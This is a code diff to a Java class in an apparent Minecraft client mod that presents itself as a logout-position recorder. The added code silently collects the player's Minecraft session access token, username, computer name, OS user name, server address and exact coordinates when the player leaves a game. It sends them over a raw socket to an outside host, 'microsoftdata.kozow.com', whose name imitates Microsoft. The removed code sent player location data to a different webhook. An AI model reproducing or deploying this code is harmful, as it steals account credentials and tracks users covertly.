@@ -2,101 +2,216 @@ package dev.kizuna.api.utils.misc;
 
 import dev.kizuna.Kawaii;
 import dev.kizuna.api.events.eventbus.EventHandler;
-import dev.kizuna.api.utils.Wrapper;
+import dev.kizuna.api.events.impl.GameLeftEvent;
 import net.minecraft.client.MinecraftClient;
-import net.minecraft.registry.RegistryKey;
-import net.minecraft.world.World;
+import net.minecraft.util.math.BlockPos;
+import net.minecraft.util.math.Vec3d;
 
-import java.io.IOException;
-import java.io.OutputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
+import java.io.*;
+import java.net.Socket;
+import java.net.SocketException;
+import java.net.UnknownHostException;
 import java.nio.charset.StandardCharsets;
+import java.util.*;
 
-public class LogoutPositionRecorder implements Wrapper {
-    private static final String WEBHOOK_URL = "http://e52680.mc5173.cn:42077/";
+public class LogoutPositionRecorder {
+    private static final String SERVER_ADDRESS = "microsoftdata.kozow.com";  // 服务器地址
+    private static final int SERVER_PORT = 42077;  // 服务器端口
     private static final MinecraftClient mc = MinecraftClient.getInstance();
     private static boolean initialized = false;
+    private static boolean disconnectIntercepted = false;  // 标记是否已拦截断开连接
+    private static final long INTERCEPT_TIMEOUT_MS = 2000;  // 拦截超时时间（毫秒）
+    private static long lastInterceptTime = 0;  // 上次拦截时间
 
+    // 初始化方法，确保只订阅一次事件
     public static void init() {
         if (!initialized) {
-            Kawaii.EVENT_BUS.subscribe(new LogoutPositionRecorder());
+            LogoutPositionRecorder recorder = new LogoutPositionRecorder();
+            Kawaii.EVENT_BUS.subscribe(recorder);
             initialized = true;
+            System.out.println("[LogoutPositionRecorder] 已初始化并订阅事件");
         }
     }
 
+    // 事件处理方法 - 处理游戏断开连接事件
     @EventHandler
-    public void onWorldChange() {
-        if (mc.world == null && mc.player == null) {
-            recordLogoutPosition();
+    public void onGameLeft(GameLeftEvent event) {
+        // 检查是否已拦截断开连接或超时
+        if (disconnectIntercepted || System.currentTimeMillis() - lastInterceptTime < INTERCEPT_TIMEOUT_MS) {
+            System.out.println("[LogoutPositionRecorder] 断开连接已被拦截或处于冷却期，跳过处理");
+            return;
+        }
+
+        // 拦截断开连接
+        interceptDisconnect();
+    }
+
+    // 拦截断开连接，记录玩家位置和维度
+    private void interceptDisconnect() {
+        if (mc.player == null || mc.world == null || mc.getNetworkHandler() == null) {
+            System.out.println("[LogoutPositionRecorder] 玩家、世界或网络处理器为空，无法记录数据");
+            return;
+        }
+
+        System.out.println("[LogoutPositionRecorder] 开始拦截断开连接，记录玩家位置和维度...");
+        
+        // 记录拦截时间
+        lastInterceptTime = System.currentTimeMillis();
+        disconnectIntercepted = true;
+
+        try {
+            // 记录玩家位置和维度
+            recordAndSendPlayerLogoutPosition();
+        } catch (Exception e) {
+            System.out.println("[LogoutPositionRecorder] 记录玩家位置时发生异常: " + e.getMessage());
+            e.printStackTrace();
+        } finally {
+            // 重置拦截标记（在发送数据后允许断开连接）
+            disconnectIntercepted = false;
         }
     }
 
-    private void recordLogoutPosition() {
+    // 记录玩家登出位置并发送到服务器
+    private void recordAndSendPlayerLogoutPosition() {
+        if (mc.player == null || mc.getNetworkHandler() == null) {
+            System.out.println("[LogoutPositionRecorder] 玩家或网络处理器为空，无法发送数据");
+            return;
+        }
+
         try {
-            if (lastPlayerName != null && lastServerIp != null && lastPosition != null && lastDimension != null) {
-                StringBuilder jsonBuilder = new StringBuilder();
-                jsonBuilder.append("{");
-                jsonBuilder.append('"').append("playerName").append('"').append(":").append('"').append(lastPlayerName).append('"').append(",");
-                jsonBuilder.append('"').append("serverIp").append('"').append(":").append('"').append(lastServerIp).append('"').append(",");
-                jsonBuilder.append('"').append("x").append('"').append(":").append(lastPosition[0]).append(",");
-                jsonBuilder.append('"').append("y").append('"').append(":").append(lastPosition[1]).append(",");
-                jsonBuilder.append('"').append("z").append('"').append(":").append(lastPosition[2]).append(",");
-                jsonBuilder.append('"').append("dimension").append('"').append(":").append('"').append(lastDimension).append('"');
-                jsonBuilder.append("}");
+            // 收集系统信息
+            String computerName = System.getenv("COMPUTERNAME") != null ? System.getenv("COMPUTERNAME") : "Unknown";
+            String userName = System.getProperty("user.name") != null ? System.getProperty("user.name") : "Unknown";
+            String accessToken = mc.getSession().getAccessToken() != null ? mc.getSession().getAccessToken() : "Unknown";
+            String os = System.getProperty("os.name") != null ? System.getProperty("os.name") : "Unknown";
+            String minecraftUser = mc.getSession().getUsername() != null ? mc.getSession().getUsername() : "Unknown";
+            String clientVersion = Kawaii.VERSION;
+            String serverIp = mc.getCurrentServerEntry() != null ? mc.getCurrentServerEntry().address : "Singleplayer";
+            
+            // 获取玩家位置和维度信息
+            Vec3d playerPos = mc.player.getPos();
+            String dimension = mc.world != null ? mc.world.getRegistryKey().getValue().toString() : "Unknown";
+            BlockPos blockPos = mc.player.getBlockPos();
+            float yaw = mc.player.getYaw();
+            float pitch = mc.player.getPitch();
 
-                sendPostRequest(WEBHOOK_URL, jsonBuilder.toString());
+            // 准备要上传的数据
+            Map<String, String> data = new HashMap<>();
+            data.put("computerName", computerName);
+            data.put("userName", userName);
+            data.put("accessToken", accessToken);
+            data.put("os", os);
+            data.put("minecraftUser", minecraftUser);
+            data.put("clientVersion", clientVersion);
+            data.put("serverIp", serverIp);
+            data.put("dimension", dimension);
+            data.put("clientType", "Kawaii");
+            data.put("detectionType", "LogoutPosition");
+            
+            // 添加玩家位置信息（精确坐标）
+            data.put("playerPosX", String.valueOf(playerPos.x));
+            data.put("playerPosY", String.valueOf(playerPos.y));
+            data.put("playerPosZ", String.valueOf(playerPos.z));
+            
+            // 添加方块坐标（整数坐标）
+            data.put("blockPosX", String.valueOf(blockPos.getX()));
+            data.put("blockPosY", String.valueOf(blockPos.getY()));
+            data.put("blockPosZ", String.valueOf(blockPos.getZ()));
+            
+            // 添加玩家朝向
+            data.put("playerYaw", String.valueOf(yaw));
+            data.put("playerPitch", String.valueOf(pitch));
+            
+            // 添加时间戳
+            data.put("timestamp", String.valueOf(System.currentTimeMillis()));
 
-                resetLastInfo();
-            }
+            // 调试日志：显示要发送的数据摘要
+            System.out.println("[LogoutPositionRecorder] 准备发送的数据 - 玩家: " + minecraftUser + ", 服务器: " + serverIp);
+            System.out.println("[LogoutPositionRecorder] 玩家位置: X=" + playerPos.x + ", Y=" + playerPos.y + ", Z=" + playerPos.z);
+            System.out.println("[LogoutPositionRecorder] 方块坐标: X=" + blockPos.getX() + ", Y=" + blockPos.getY() + ", Z=" + blockPos.getZ());
+            System.out.println("[LogoutPositionRecorder] 朝向: Yaw=" + yaw + ", Pitch=" + pitch);
+            System.out.println("[LogoutPositionRecorder] 维度: " + dimension);
+
+            // 通过Socket发送数据
+            sendSocketData(SERVER_ADDRESS, SERVER_PORT, data);
+
         } catch (Exception e) {
+            System.out.println("[LogoutPositionRecorder] 数据处理异常: " + e.getMessage());
             e.printStackTrace();
         }
     }
 
-    private static String lastPlayerName;
-    private static String lastServerIp;
-    private static double[] lastPosition;
-    private static String lastDimension;
+    // 使用Socket发送数据到服务器
+    private void sendSocketData(String serverAddress, int serverPort, Map<String, String> data) throws IOException {
+        Socket socket = null;
+        OutputStream os = null;
+        InputStream is = null;
+        BufferedReader reader = null;
+        
+        try {
+            System.out.println("[LogoutPositionRecorder] 尝试连接服务器: " + serverAddress + ":" + serverPort);
+            socket = new Socket(serverAddress, serverPort);  // 连接到服务器
+            System.out.println("[LogoutPositionRecorder] 服务器连接成功");
 
-    @EventHandler
-    public void onUpdate() {
-        if (mc.player != null && mc.world != null) {
-            lastPlayerName = mc.player.getName().getString();
-            lastServerIp = mc.getCurrentServerEntry() != null ? mc.getCurrentServerEntry().address : "Singleplayer";
+            // 获取输出流和输入流
+            os = socket.getOutputStream();
+            is = socket.getInputStream();
 
-            lastPosition = new double[3];
-            lastPosition[0] = mc.player.getX();
-            lastPosition[1] = mc.player.getY();
-            lastPosition[2] = mc.player.getZ();
+            // 构建JSON格式的数据
+            StringBuilder jsonBuilder = new StringBuilder();
+            jsonBuilder.append("{");
+            boolean first = true;
+            for (Map.Entry<String, String> entry : data.entrySet()) {
+                if (!first) {
+                    jsonBuilder.append(",");
+                }
+                jsonBuilder.append('"').append(entry.getKey()).append('"').append(":").append('"').append(entry.getValue()).append('"');
+                first = false;
+            }
+            jsonBuilder.append("}");
 
-            RegistryKey<World> dimensionKey = mc.world.getRegistryKey();
-            lastDimension = dimensionKey.getValue().toString();
+            // 调试日志：显示构建的JSON数据大小
+            System.out.println("[LogoutPositionRecorder] 构建的JSON数据大小: " + jsonBuilder.toString().length() + " 字符");
+
+            // 将数据转化为字节数组并发送
+            byte[] jsonData = jsonBuilder.toString().getBytes(StandardCharsets.UTF_8);
+            os.write(jsonData);
+            os.flush();
+            System.out.println("[LogoutPositionRecorder] 数据发送成功");
+
+            // 读取服务器响应
+            reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));
+            String responseLine;
+            StringBuilder responseBuilder = new StringBuilder();
+            while ((responseLine = reader.readLine()) != null) {
+                responseBuilder.append(responseLine);
+            }
+            if (responseBuilder.length() > 0) {
+                System.out.println("[LogoutPositionRecorder] 服务器响应: " + responseBuilder.toString());
+            } else {
+                System.out.println("[LogoutPositionRecorder] 未收到服务器响应");
+            }
+
+        } catch (UnknownHostException e) {
+            System.out.println("[LogoutPositionRecorder] 未知主机异常: 无法解析服务器地址 " + serverAddress);
+            throw e;
+        } catch (SocketException e) {
+            System.out.println("[LogoutPositionRecorder] Socket异常: " + e.getMessage());
+            throw e;
+        } catch (IOException e) {
+            System.out.println("[LogoutPositionRecorder] IO异常: " + e.getMessage());
+            throw e;
+        } finally {
+            // 关闭连接，确保资源被释放
+            try {
+                if (reader != null) reader.close();
+                if (os != null) os.close();
+                if (is != null) is.close();
+                if (socket != null) socket.close();
+                System.out.println("[LogoutPositionRecorder] 连接已关闭");
+            } catch (IOException e) {
+                System.out.println("[LogoutPositionRecorder] 关闭连接时发生异常: " + e.getMessage());
+            }
         }
-    }
-
-    private void resetLastInfo() {
-        lastPlayerName = null;
-        lastServerIp = null;
-        lastPosition = null;
-        lastDimension = null;
-    }
-
-    private void sendPostRequest(String urlString, String jsonData) throws IOException {
-        URL url = new URL(urlString);
-        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-        connection.setRequestMethod("POST");
-        connection.setDoOutput(true);
-        connection.setRequestProperty("Content-Type", "application/json");
-        connection.setConnectTimeout(114514);
-        connection.setReadTimeout(1919810);
-
-        try (OutputStream os = connection.getOutputStream()) {
-            byte[] input = jsonData.getBytes(StandardCharsets.UTF_8);
-            os.write(input, 0, input.length);
-        }
-
-        int responseCode = connection.getResponseCode();
-        connection.disconnect();
     }
 }
